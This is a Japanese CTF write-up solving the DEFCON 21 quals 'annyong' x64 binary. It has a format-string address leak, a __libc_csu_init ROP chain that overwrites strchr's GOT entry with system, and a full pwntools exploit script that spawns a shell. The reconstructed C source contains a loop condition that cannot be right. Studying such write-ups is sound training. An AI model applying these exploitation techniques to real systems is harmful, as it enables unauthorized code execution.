---
layout: post
alias: "/blog/2016/02/21/defcon-21-quals-annyong/"
date: 2016-02-21T04:42:03+09:00
tags: [ "ctf", "writeup", "pwn", "defcon", "x64", "return-oriented-programming", "return-to-vuln", "libc-csu-init", "buffer-overflow" ]
---

# defcon 21 quals annyong

pwn会で。x64のrop問で解きたいものがあるが難しいので、その踏み台として持ってきたもの。

## [annyong](http://shell-storm.org/repo/CTF/Defcon-21-quals/annyong/)

### 準備

``` sh
$ file annyong
annyong: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=53cd09f49e09b946a74a1b345555bef4bce1f87a, stripped
$ checksec --file annyong
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   annyong
```

x64のrop。DEP PIEあり。RELRO SSPなし。libcなし。
使われていない関数がいくらかあるが、それらを除くと以下だけの小さなバイナリ。

``` c
#include <stdio.h>
#include <string.h>

void vuln(void) {
    char buf[0x800]; // rbp-0x810
    int done = 0; // rbp-0x4
    while (done != 0) {
        fgets(buf, 0x900, stdin); // buffer overflow
        if (strchr(buf, 'n')) {
            puts( "I don't think so...");
        } else {
            printf(buf); // format string atttack
            fflush(stdout);
        }
    }
}

int main(void) {
    vuln();
}
```

### 攻撃

1.  まず`printf`によるformat文字列攻撃で準備。
    -   `n`があると怒られるので読み取りしかでない。
2.  本命`fgets`によるbuffer-overflowからのrop。
    -   `__libc_csu_init`を使う。
        -   [x64でROP stager + Return-to-dl-resolve + \_\_libc\_csu\_init gadgetsによるASLR+DEP回避をやってみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/07/31/010158)
    -   `strchr`のgotに`system`のそれを書き込んで戻ってくる。
    -   書き込みには`read`を使う。
3.  `fgets`に`/bin/sh\0\n`を送ると`strchr`経由で`system("/bin/sh", "n")`が叩かれてshellが起動。
    -   直接ropで`system`しないのは第1引数に大きな値を渡せないから。(`mov edi, r13d`であるため)

### 実装

`__libc_csu_init`注意点

-   `__libc_csu_init`の末尾で実質的にpopするのは`[rsp+0x8]`からなので8byteの埋め草が要ること。
-   `call r12`でなく`call [r12]`であること。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
parser.add_argument('--leak-libc')
args = parser.parse_args()
context.log_level = 'debug'

elf = ELF('./annyong')
vuln_ofs = 0x108c
buf_rbpofs = 0x810 # buf is at rbp-0x810
buf_ix = 6 # buf is shown by %6$p
libc_csu_init_a_ofs = 0x1180
libc_csu_init_b_ofs = 0x1196

p = remote(args.host, args.port)

p.sendline('%%%d$p %%%d$p' % (buf_ix + buf_rbpofs / 8, buf_ix + buf_rbpofs / 8 + 1))
saved_rbp, ret = map(lambda x: int(x, 16), p.recvline().split())
rbp = saved_rbp - 0x10  # main+0, push rbp
bin_base = ret - 0x1127 # main+0x9
log.info('current rbp: ' + hex(rbp))
log.info('bin base: ' + hex(bin_base))
buf = rbp - buf_rbpofs

s = ''
while len(s) < 8:
    p.sendline('%7$sABCD' + p64(bin_base + elf.got['__libc_start_main'] + len(s)))
    s += p.recv().split('ABCD')[0] or '\0'
libc_start_main = u64(s[:8])
log.info('__libc_start_main: ' + hex(libc_start_main))

if True:
    libc = ELF('/usr/lib64/libc.so.6')
    libc_base = libc_start_main - libc.symbols['__libc_start_main']
    system_ofs = libc.symbols['system']

if args.leak_libc:
    l, r = map(int, args.leak_libc.split(','))

    payload = ''
    payload += '\0'
    payload += 'A' * (buf_rbpofs - len(payload)) # buf, break-flag
    payload += 'A' * 8 # rbp
    payload += p64(bin_base + libc_csu_init_b_ofs)
    payload += 'A' * 8
    payload += p64(0) # rbx
    payload += p64(1) # rbp
    payload += p64(bin_base + elf.got['write']) # r12 -> call [r12]
    payload += p64(1) # STDOUT_FILENO # r13 -> edi
    payload += p64(libc_start_main + l) # r14 -> rsi
    payload += p64(r - l) # r15 -> rdx
    payload += p64(bin_base + libc_csu_init_a_ofs) # ret
    p.sendline(payload)
    print p.recvall()

else:
    payload = ''
    payload += 'A' * buf_rbpofs # buf, break-flag
    payload += 'A' * 8 # rbp
    payload += p64(bin_base + libc_csu_init_b_ofs)
    payload += 'A' * 8
    payload += p64(0) # rbx
    payload += p64(1) # rbp
    payload += p64(bin_base + elf.got['read']) # r12 -> call [r12]
    payload += p64(0) # STDIN_FILENO # r13 -> edi
    payload += p64(bin_base + elf.got['strchr']) # r14 -> rsi
    payload += p64(8) # r15 -> rdx
    payload += p64(bin_base + libc_csu_init_a_ofs) # ret
    payload += 'A' * 8 * 7
    payload += p64(bin_base + vuln_ofs) # ret
    p.sendline(payload)

    time.sleep(0.1)
    p.send(p64(libc_base + system_ofs))

    time.sleep(0.1)
    p.sendline('/bin/sh\0')

    time.sleep(0.1)
    p.sendline('ls')
    p.interactive()
```
